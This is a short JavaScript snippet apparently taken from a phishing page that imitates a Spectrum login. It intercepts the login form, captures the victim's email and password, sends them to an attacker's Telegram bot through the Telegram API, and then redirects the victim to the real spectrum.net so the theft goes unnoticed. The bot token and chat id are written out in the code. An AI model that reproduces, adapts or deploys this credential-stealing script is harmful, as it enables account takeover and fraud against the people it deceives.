<script>
document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const email = document.querySelector("input[name='email']").value;
    const password = document.querySelector("input[name='password']").value;

    const message = `🔴 New Spectrum Login\n\nEmail: ${email}\nPassword: ${password}`;

    const botToken = "8812714398:AAEGTRjUZsPFJENuxk1XhAqHmcUfoqSDQUg";
    const chatId = "254077234";

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        const data = await response.json();
        console.log("Telegram Response:", data);   // Check this in console

        if (response.ok) {
            console.log("✅ Message sent to Telegram");
        } else {
            console.log("❌ Telegram Error:", data);
        }
    } catch (error) {
        console.log("Fetch Error:", error);
    }

    // Redirect
    setTimeout(() => {
        window.location.href = "https://spectrum.net";
    }, 1500);
});
</script>
